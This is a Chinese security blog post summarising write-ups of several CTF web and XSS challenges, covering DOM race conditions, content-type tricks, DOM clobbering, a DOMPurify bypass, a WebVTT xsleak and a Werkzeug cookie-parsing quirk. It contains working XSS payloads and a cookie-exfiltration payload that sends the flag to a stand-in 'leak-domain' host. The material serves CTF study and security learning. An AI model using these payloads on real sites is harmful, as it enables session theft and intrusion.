

# 一堆來不及做的 web 與 XSS 題目 - Huli's blog --- 一堆来不及做的 web 与 XSS 题目 - Huli's blog

# 一堆来不及做的 web 与 XSS 题目

2023年12月3日

[↓↓↓](https://blog.huli.tw/categories/Security/)  
  
 安全  
  
[↑↑↑](https://blog.huli.tw/categories/Security/)

因为最近有点忙的关系，这两三个月比较少打CTF了，但还是会在推特上看到一些有趣的题目。 虽然没时间打，但笔记还是要记的，没记的话下次看到铁定还是做不出来。

这篇主要记一些网页前端相关的题目，由于自己可能没有实际下去解题，所以内容都是参考别人的笔记之后再记录一些心得。

 关键字列表：

1.  copy paste XSS
2.   连接池
3.  content type UTF16
4.   多部分/混合
5.  Chrome DevTools Protocol
6.  新无头模式默认下载
7.  滚动到文本片段 （STTF）
8.  webVTT cue xsleak
9.  flask/werkzeug cookie parsing quirks

##  基于 DOM 的争用条件

来源： https://twitter.com/ryotkak/status/1710291366654181749

题目很简单，就给你一个可编辑的 div 加上 Angular，允许任何的 user interaction，要做到 XSS。

```markup
<div contenteditable></div>
<script src="https://angular-no-http3.ryotak.net/angular.min.js"></script>
```

当初看到题目的时候有猜到应该跟 copy paste 有关，解答中有提到说在 `<div contenteditable></div>` 贴上内容时，是可以贴上 HTML 的。 虽然浏览器后来有做 sanitizer，但并不会针对自定义的属性。

也就是说，如果搭配其他 gadget 的话，还是有机会做到 XSS。

例如说作者的文章中提到的这个 pattern，因为有 AngularJS 的关系所以会执行代码：

```markup
<html ng-app>
  <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.min.js"></script>
  <div ng-init="constructor.constructor('alert(1)')()"></div>
</html>
```

但问题是用户在贴入 payload 的时候，AngularJS 已经加载完毕了。 加载完成的时候如果 payload 还不存在，那就不会被执行，所以需要延长 AngularJS 加载的时间。

最后作者是用 connection pool 来解决这问题的，就是把 pool 塞爆，就可以延长 script 的加载时间，在加载完成以前贴好 payload。

作者 writeup：[https://blog.ryotak.net/post/dom-based-race-condition/](https://blog.ryotak.net/post/dom-based-race-condition/)

##  罕见的 Content-type 与 UTF16

來源：[https://twitter.com/avlidienbrunn/status/1703805922043220273](https://twitter.com/avlidienbrunn/status/1703805922043220273)

 题目如下：

```php
<?php
/*
FROM php:7.0-apache

RUN a2dismod status

COPY ./files/index.php /var/www/html
COPY ./files/harder.php /var/www/html
EXPOSE 80

*/
$message = isset($_GET['message']) ? $_GET['message'] : 'hello, world';
$type = isset($_GET['type']) ? $_GET['type'] : die(highlight_file(__FILE__));
header("Content-Type: text/$type");
header("X-Frame-Options: DENY");

if($type == "plain"){
    die("the message is: $message");
}

?>
<html>
<h1>The message is:</h1>
<hr/>
<pre>
    <input type="text" value="<?php echo preg_replace('/([^\s\w!-~]|")/','',$message);?>">
</pre>
<br>
solved by:
<li> nobody yet!</li>
</html>
```

可以控制部分内容以及部分 content type，该怎么做到 XSS？

第一招是让 content type 为 `text/html; charset=UTF-16LE` ，就可以让浏览器把页面解读为 UTF16，控制输出内容。

这招让我想到了 UIUCTF 2022 中的 modernism 那题。

第二招是先运用 content type header 的特性，当 response header 是 `Content-Type: text/x,image/gif` 时，因为 `text/x` 是非法的 content type，所以浏览器会优先看合法的 `image/gif` 。

也就是说，尽管 content type 的前半段是写死的，依然可以利用这个技巧覆盖掉完整的 content type。 而有一个古老的 content type 叫做 `multipart/mixed` ，像是 response 版的 multipart/form，可以输出像这样的 response：

```none
HTTP/1.1 200 OK
Content-type: multipart/mixed;boundary="8ormorebytes"


ignored_first_part_before_boundary

--8ormorebytes
Content-Type: text/html

<img src=x onerror=alert(domain)>

--8ormorebytes

ignored_last_part
```

浏览器会挑自己看得懂的部分去render，而Firefox有支持这个content type。

话说这个 content type 还可以拿来绕过 CSP，可以参考这个链接： https://twitter.com/ankursundara/status/1723410507389129092

## Intigriti October 2023 challenge

题目： https://challenge-1023.intigriti.io/

 在后端有个注入点：

```markup
<title>Intigriti XSS Challenge - <%- title %></title>
```

 这个 title 来自于：

```javascript
const getTitle = (path) => {
    path = decodeURIComponent(path).split("/");
    path = path.slice(-1).toString();
    return DOMPurify.sanitize(path);
}
```

虽然说是DOMPurify，看似不可绕过，但其实用 `<div id="</title><h1>hello</h1>">` 可以闭合前面的 `<title>` ，就可以注入任意tag。

但这题的input是来自于path，所以要把一些 `/` 弄掉，这边最后是利用 `innerHTML` 会把属性decode的特性，用 `&sol;` 来取代 `/` ，最后凑出这样的payload：

```none
/<p id="<%26sol%3Btitle><script>alert()<%26sol%3Bscript>">
```

这题的目标是要读本地档案，所以XSS是不够的，下一步要想办法从XSS继续往下延伸。

这题的 flag 有 `--disable-web-security` ，SOP 被关掉了，可以读到其他来源的 response，而 CDP 有 origin 的限制没办法完全使用，但有部分功能可以，例如说开启一个新网页之类的。

但因为档案在本地，所以只有 `file:///` 开头的档案可以读到其他本地档案，因此目标就变成要想办法在本地弄出一个档案。

解法是在新的headless mode中，下载功能是预设开启的，所以只要触发下载以后，就会把档案存到固定规则的位置，用 CDP 打开以后即可。

作者 writeup：[https://mizu.re/post/intigriti-october-2023-xss-challenge](https://mizu.re/post/intigriti-october-2023-xss-challenge)

## DOM clobbering

来源： https://twitter.com/kevin\_mizu/status/1697625861543923906

 题目是一个自制的 sanitizer：

```javascript
class Sanitizer {
    // https://source.chromium.org/chromium/chromium/src/+/main:out/android-Debug/gen/third_party/blink/renderer/modules/sanitizer_api/builtins/sanitizer_builtins.cc;l=360
    DEFAULT_TAGS  = [ /* ... */ ];

    constructor(config={}) {
        this.version = "2.0.0";
        this.creator = "@kevin_mizu";
        this.ALLOWED_TAGS = config.ALLOWED_TAGS
            ? config.ALLOWED_TAGS.concat([ "html", "head", "body" ]).filter(tag => this.DEFAULT_TAGS.includes(tag))
            : this.DEFAULT_TAGS;
        this.ALLOWED_ATTS = config.ALLOWED_ATTS
            ? config.ALLOWED_ATTS.filter(attr => this.DEFAULT_ATTRS.includes(attr))
            : this.DEFAULT_ATTRS;
    }

    // https://github.com/cure53/DOMPurify/blob/48bd850cc20190e3896cb6291367c2da2ed2bddb/src/purify.js#L924
    _isClobbered = function (elm) {
        return (
            elm instanceof HTMLFormElement &&
            (typeof elm.nodeName !== 'string' ||
            typeof elm.textContent !== 'string' ||
            typeof elm.removeChild !== 'function' ||
            !(elm.attributes instanceof NamedNodeMap) ||
            typeof elm.removeAttribute !== 'function' ||
            typeof elm.setAttribute !== 'function' ||
            typeof elm.namespaceURI !== 'string' ||
            typeof elm.insertBefore !== 'function' ||
            typeof elm.hasChildNodes !== 'function')
        )
    }

    // https://github.com/cure53/DOMPurify/blob/48bd850cc20190e3896cb6291367c2da2ed2bddb/src/purify.js#L1028
    removeNode = (currentNode) => {
        const parentNode = currentNode.parentNode;
        const childNodes = currentNode.childNodes;

        if (childNodes && parentNode) {
            const childCount = childNodes.length;

            for (let i = childCount - 1; i >= 0; --i) {
                parentNode.insertBefore(
                    childNodes[i].cloneNode(),
                    currentNode.nextSibling
                );
            }
        }

        currentNode.parentElement.removeChild(currentNode);
    }

    sanitize = (input) => {
        let currentNode;
        var dom_tree = new DOMParser().parseFromString(input, "text/html");
        var nodeIterator = document.createNodeIterator(dom_tree);

        while ((currentNode = nodeIterator.nextNode())) {

            // avoid DOMClobbering
            if (this._isClobbered(currentNode) || typeof currentNode.nodeType !== "number") {
                this.removeNode(currentNode);
                continue;
            }

            switch(currentNode.nodeType) {
                case currentNode.ELEMENT_NODE:
                    var tag_name   = currentNode.nodeName.toLowerCase();
                    var attributes = currentNode.attributes;

                    // avoid mXSS
                    if (currentNode.namespaceURI !== "http://www.w3.org/1999/xhtml") {
                        this.removeNode(currentNode);
                        continue;

                    // sanitize tags
                    } else if (!this.ALLOWED_TAGS.includes(tag_name)){
                        this.removeNode(currentNode);
                        continue;
                    }

                    // sanitize attributes
                    for (let i=0; i < attributes.length; i++) {
                        if (!this.ALLOWED_ATTS.includes(attributes[i].name)){
                            this.removeNode(currentNode);
                            continue;
                        }
                    }
            }
        }

        return dom_tree.body.innerHTML;
    }
}
```

内容有参考许多其他的 sanitizer library，像是 DOMPurify 等等。

这题的关键是以往对于 form 的 DOM clobber，都是像这样：

```markup
<form id="test">
    <input name=x>
</form>
```

理所当然地把元素放在 form 里面，就可以污染 `test.x` 。

但其实还有一招是使用 `form` 属性，就可以把元素放在外面：

```markup
<input form=test name=x>
<form id="test"></form>
```

这一题的 sanitizer 在移除元素时，是这样做的：

```javascript
removeNode = (currentNode) => {
    const parentNode = currentNode.parentNode;
    const childNodes = currentNode.childNodes;

    if (childNodes && parentNode) {
        const childCount = childNodes.length;

        for (let i = childCount - 1; i >= 0; --i) {
            parentNode.insertBefore(
                childNodes[i].cloneNode(),
                currentNode.nextSibling
            );
        }
    }

    currentNode.parentElement.removeChild(currentNode);
}
```

把要删除的元素底下的 node，都插入到 parent 的 nextSibling 去。

因此，如果 clobber 了 nextSibling，制造出这样的结构：

```markup
<input form=test name=nextSibling> 
<form id=test>
  <input name=nodeName>
  <img src=x onerror=alert(1)>
</form>
```

就会在移除 `<form>` 时，把底下的节点都插入到 `<input form=test name=nextSibling>` 后面，借此绕过sanitizer。

真有趣的题目！虽然知道有 `form` 这个属性，但还没想过可以拿来搭配 DOM clobbering。

作者的 writeup：[https://twitter.com/kevin\_mizu/status/1701922141791211776](https://twitter.com/kevin_mizu/status/1701922141791211776)

## LakeCTF 2023 GeoGuessy

來源是參考這篇 writeup： XSS， Race Condition， XS-Leaks and CSP & iframe 的沙盒旁路 - LakeCTF 2023 GeoGuessy

先来看两个有趣的 unintended，第一个是利用 cookie 不看 port 的特性，用其他题目的 XSS 来拿到 cookie，不同题目之间如果没有隔离好就会这样，例如说 SekaiCTF 2023 - leakless note 也是。

第二个是写 code 的 bad practice 造成的 race condition。

在访问页面时会去配置 user，这边的 user 是 global variable：

```javascript
router.get('/', async (req, res) => {
    user = await db.getUserBy("token", req.cookies?.token)
    if (user) {
         isPremium = user.isPremium
        username = user.username
        return res.render('home',{username, isPremium});
    } else {
        res.render('index');
    }
});
```

然后 update user 时也是用类似的模式，拿到 user 之后修改数据写入：

```javascript
router.post('/updateUser', async (req, res) => {
    token = req.cookies["token"]
    if (token) {
        user = await db.getUserBy("token", token)
        if (user) {
            enteredPremiumPin = req.body["premiumPin"]
            if (enteredPremiumPin == premiumPin) {
                user.isPremium = 1
            }
            // ...
            await db.updateUserByToken(token, user)
            return res.status(200).json('yes ok');
        }
    }
    return res.status(401).json('no');
});
```

admin bot 每次都会执行 updateUser，把 admin user 的 isPremium 设定成 1。

由于user是 global variable，db 的操作又是async的，所以如果速度够快的话，updateUser里的user会是另一个user，就可以把自己的user设定成 premium account。

intended 的話是用 Scroll to Text Fragment （STTF） 來解。

## N1CTF - ytiruces

 引用数据 ：

1.  [https://dem0dem0.top/2023/10/20/n1ctf2023/](https://dem0dem0.top/2023/10/20/n1ctf2023/)
2.  [https://nese.team/posts/n1ctf2023/](https://nese.team/posts/n1ctf2023/)

用 WebVTT，一个显示字幕的格式搭配 CSS selector `video::cue(v[voice^="n1"])` 来 xsleak。

[https://developer.mozilla.org/en-US/docs/Web/CSS/::cue](https://developer.mozilla.org/en-US/docs/Web/CSS/::cue)

真是有趣的 selector。

## Werkzeug cookie parsing quirks

來源：[Another HTML Renderer](https://mizu.re/post/another-html-renderer)

这题又是来自于 @kevin\_mizu，前面已经有介绍过两题他出的题目了，而这题又是一个有趣的题目！

这题有一个 admin bot 会设定 cookie，里面有 flag，所以目标就是偷到这个 cookie，而核心代码如下：

```python
@app.route("/render")
def index():
    settings = ""
    try:
        settings = loads(request.cookies.get("settings"))
    except: pass

    if settings:
        res = make_response(render_template("index.html",
            backgroundColor=settings["backgroundColor"] if "backgroundColor" in settings else "#ffde8c",
            textColor=settings["textColor"] if "textColor" in settings else "#000000",
            html=settings["html"] if "html" in settings else ""
        ))
    else:
        res = make_response(render_template("index.html", backgroundColor="#ffde8c", textColor="#000000"))
        res.set_cookie("settings", "{}")

    return res
```

Python 这边主要会根据 cookie 内的参数来 render 页面，template 如下：

```markup
<iframe
  id="render"
  sandbox=""
  srcdoc="<style>* { text-align: center; }</style>{{html}}"
  width="70%"
  height="500px">
</iframe>
```

就算控制了 html，也只能在 sandbox iframe 里面，不能执行代码，也不是 same origin。 但以往如果要偷 cookie 的话，基本上都需要先有 same-origin 的 XSS 才行。

而前端的部分可以设定 cookie，但会过滤掉 `html` 这个字，所以不让你设定 html：

```javascript
const saveSettings = (settings) => {
    document.cookie = `settings=${settings}`;
}

const getSettings = (d) => {
    try {
        s = JSON.parse(d);
        delete s.html;
        return JSON.stringify(s);
    } catch {
        while (d != d.replaceAll("html", "")) {
            d = d.replaceAll("html", "");
        }
        return d;
    }
}

window.onload = () => {
    const params = (new URLSearchParams(window.location.search));
    if (params.get("settings")) {
        window.settings = getSettings(params.get("settings"));
        saveSettings(window.settings);
        renderSettings(window.settings);
    } else {
        window.settings = getCookie("settings");
    }
    window.settings = JSON.parse(window.settings);
```

那这题到底要怎么解呢？这一切都与 werkzeug 解析 cookie 时的逻辑有关。

先来讲如何绕过那个 html 的检查，在 werkzeug 里面如果你的 cookie value 是用 `""` 包住的话，会先进行 decode，因此 `"\150tml"` 会被 decode 成 `"html"` ，就可以绕过对于 html 关键词的检查。

但绕过之后，要怎么拿到 flag 呢？这就要用到 werkzeug 第二个解析 cookie 的特殊之处了。 当 werkzeug 在解析 cookie 时，如果碰到 `"` 时，就会解析到下一个 `"` 为止。

 举例来说，假设 cookie 的内容是这样：

```none
Cookie: cookie1="abc; cookie2=def";
```

 最后得到的结果会是： `"cookie1": "abc; cookie2=def"`

也就是说，如果我们在 flag 的前后各夹一个 cookie，就可以让 flag 包含在 html 里面，让 flag 的内容出现在 html 中，再用其他任何方式把 cookie 拿走，底下直接用作者的 payload：

```none
Cookie: settings="{\"\150tml\": "<img src='https://leak-domain/?cookie= ;flag=GH{FAKE_FLAG}; settings='>\"}"
```

看完这题才突然想到以前 DiceCTF 2023 也出现过类似的题目，那时候是 jetty 有这个行为： Web - jnotes （6 solves），看来搞不好还不少 web framework 有这个 parsing 行为。

[#Security](https://blog.huli.tw/tags/Security/)

[↓↓↓](https://blog.huli.tw/2023/11/27/server-side-rendering-ssr-and-isomorphic/)  
  
从历史的角度探讨多种 SSR（Server-side rendering）  
  
[↑↑↑](https://blog.huli.tw/2023/11/27/server-side-rendering-ssr-and-isomorphic/)
